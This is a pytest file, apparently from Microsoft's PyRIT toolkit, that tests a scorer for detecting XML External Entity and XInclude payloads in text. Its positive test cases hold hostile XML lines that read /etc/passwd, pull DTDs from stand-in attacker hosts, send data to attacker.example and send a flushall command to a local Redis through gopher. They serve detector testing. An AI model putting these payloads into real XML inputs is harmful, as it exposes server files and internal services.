# Copyright (c) Microsoft Corporation.
# Licensed under the MIT license.

from unittest.mock import MagicMock, patch

import pytest

from pyrit.memory import CentralMemory
from pyrit.memory.memory_interface import MemoryInterface
from pyrit.score import XXEOutputScorer


@pytest.mark.parametrize(
    "text",
    [
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
        '<!ENTITY % ext SYSTEM "http://evil.com/dtd">',
        '<!DOCTYPE foo [<!ENTITY x "y">]>',
        '<!ENTITY data SYSTEM "https://attacker.com/x">',
        '<xi:include href="file:///etc/passwd" />',
        '<xi:include href="https://attacker.example/collect" />',
        '<include xmlns="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" />',
        "<include href='FTP://attacker.example/data'\nxmlns='http://www.w3.org/2001/XInclude' />",
        "<xi:include\nparse='text' href = 'http://attacker.example/data' />",
        '<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">',
        '<!DOCTYPE test SYSTEM "file:///etc/passwd">',
        '<!DOCTYPE doc PUBLIC "-//Attacker//DTD//EN" "http://attacker.com/evil.dtd">',
        '<!ENTITY secret SYSTEM "netdoc:///etc/passwd">',
        '<!ENTITY data SYSTEM "gopher://127.0.0.1:6379/_flushall">',
        '<!DOCTYPE foo SYSTEM "netdoc:///etc/passwd">',
    ],
)
async def test_xxe_detected(text: str, patch_central_database):
    scorer = XXEOutputScorer()
    score = (await scorer.score_text_async(text))[0]
    assert score.get_value() is True


@pytest.mark.parametrize(
    "text",
    [
        "Define an entity in your project glossary.",
        "<!DOCTYPE html>",
        "The &amp; entity reference is standard HTML.",
        "Use XML for your configuration files.",
        '<xi:include href="relative-notes.xml" />',
        '<document href="file:///etc/passwd" />',
        '<include href="https://example.com/help.xml" />',
        '<include xmlns="https://example.com/schema" href="https://example.com/help.xml" />',
        '<xi:include data-href="https://example.com/help.xml" />',
        '<xi:include x:href="https://example.com/help.xml" />',
        '<xi:include-notes href="https://example.com/help.xml" />',
        '<other:include href="https://example.com/help.xml" />',
        '<include xmlns="http://www.w3.org/2001/XInclude" data-href="https://example.com/help.xml" />',
        '<!DOCTYPE note SYSTEM "note.dtd">',
        "<!DOCTYPE note [<!ELEMENT note (to,from,heading,body)>]>",
    ],
)
async def test_xxe_not_detected(text: str, patch_central_database):
    scorer = XXEOutputScorer()
    score = (await scorer.score_text_async(text))[0]
    assert score.get_value() is False


async def test_xxe_scorer_rationale_includes_pattern_name(patch_central_database):
    scorer = XXEOutputScorer()
    score = (await scorer.score_text_async('<!ENTITY xxe SYSTEM "file:///etc/passwd">'))[0]
    assert score.get_value() is True
    assert "External Entity Declaration" in score.score_rationale


async def test_xxe_scorer_rationale_includes_external_dtd(patch_central_database):
    scorer = XXEOutputScorer()
    score = (await scorer.score_text_async('<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">'))[0]
    assert score.get_value() is True
    assert "External DTD Declaration" in score.score_rationale


async def test_xxe_scorer_custom_patterns(patch_central_database):
    custom = {"Marker": r"DANGER_XML_\d+"}
    scorer = XXEOutputScorer(patterns=custom)

    score = (await scorer.score_text_async("payload DANGER_XML_42"))[0]
    assert score.get_value() is True

    score = (await scorer.score_text_async('<!ENTITY xxe SYSTEM "file:///etc/passwd">'))[0]
    assert score.get_value() is False


async def test_xxe_scorer_adds_to_memory():
    memory = MagicMock(MemoryInterface)
    with patch.object(CentralMemory, "get_memory_instance", return_value=memory):
        scorer = XXEOutputScorer()
        await scorer.score_text_async(text="nothing here")

        memory.add_scores_to_memory_async.assert_called_once()
